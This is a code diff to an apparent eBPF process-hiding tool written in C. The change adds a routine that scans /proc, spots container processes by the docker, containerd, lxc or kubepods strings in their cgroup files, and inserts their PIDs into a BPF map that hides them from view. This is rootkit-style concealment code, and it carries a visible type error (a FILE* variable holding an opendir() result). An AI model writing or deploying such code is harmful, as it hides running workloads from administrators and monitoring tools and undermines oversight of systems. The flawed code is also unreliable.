@@ -7,6 +7,7 @@
 #include <stdint.h>
 #include <sys/resource.h>
 #include <sys/stat.h>
+#include <dirent.h>
 #include <bpf/libbpf.h>
 #include <bpf/bpf.h>
 #include "output/hide_process_bpf.skel.h"
@@ -25,6 +26,83 @@ static bool verbose = false;
 static void sig_handler(int sig)
 {
     exiting = true;
+}
+
+/* ENHANCED: Scan existing processes for container detection */
+static int scan_existing_container_processes(struct hide_process_bpf *skel)
+{
+    FILE *proc_dir;
+    struct dirent *entry;
+    char cgroup_path[256];
+    char cgroup_content[1024];
+    FILE *cgroup_file;
+    int hidden_count = 0;
+    int map_fd = bpf_map__fd(skel->maps.hidden_pid_map);
+
+    /* Open /proc directory */
+    proc_dir = opendir("/proc");
+    if (!proc_dir) {
+        fprintf(stderr, "Failed to open /proc directory\n");
+        return -1;
+    }
+
+    if (verbose) {
+        printf("Scanning /proc for existing container processes...\n");
+    }
+
+    /* Iterate through /proc entries */
+    while ((entry = readdir(proc_dir)) != NULL) {
+        /* Check if entry is a PID directory */
+        if (strspn(entry->d_name, "0123456789") != strlen(entry->d_name)) {
+            continue; /* Not a PID */
+        }
+
+        int pid = atoi(entry->d_name);
+        if (pid <= 1) {
+            continue; /* Skip kernel threads and init */
+        }
+
+        /* Read cgroup file for this PID */
+        sprintf(cgroup_path, "/proc/%d/cgroup", pid);
+        cgroup_file = fopen(cgroup_path, "r");
+        if (!cgroup_file) {
+            continue; /* Process might have exited */
+        }
+
+        /* Read cgroup content */
+        size_t bytes_read = fread(cgroup_content, 1, sizeof(cgroup_content) - 1, cgroup_file);
+        fclose(cgroup_file);
+
+        if (bytes_read == 0) {
+            continue;
+        }
+        cgroup_content[bytes_read] = '\0';
+
+        /* Check for container indicators in cgroup */
+        if (strstr(cgroup_content, "docker") ||
+            strstr(cgroup_content, "containerd") ||
+            strstr(cgroup_content, "lxc") ||
+            strstr(cgroup_content, "kubepods")) {
+
+            /* This is a container process - add to hidden map */
+            int value = 1;
+            int err = bpf_map_update_elem(map_fd, &pid, &value, BPF_ANY);
+            if (err == 0) {
+                hidden_count++;
+                if (verbose) {
+                    printf("Auto-detected container process: PID %d\n", pid);
+                }
+            }
+        }
+    }
+
+    closedir(proc_dir);
+
+    if (verbose) {
+        printf("✅ Scan complete: %d existing container processes auto-hidden\n", hidden_count);
+    }
+
+    return hidden_count;
 }
 
 static int libbpf_print_fn(enum libbpf_print_level level, const char *format, va_list args)
@@ -214,6 +292,12 @@ int main(int argc, char **argv)
     }
 
     printf("Program is now active. Press Ctrl+C to exit.\n");
+
+    /* ENHANCED: Scan existing processes for container detection */
+    if (verbose) {
+        printf("Scanning existing processes for containers...\n");
+    }
+    scan_existing_container_processes(skel);
 
     /* Set up signal handlers */
     signal(SIGINT, sig_handler);
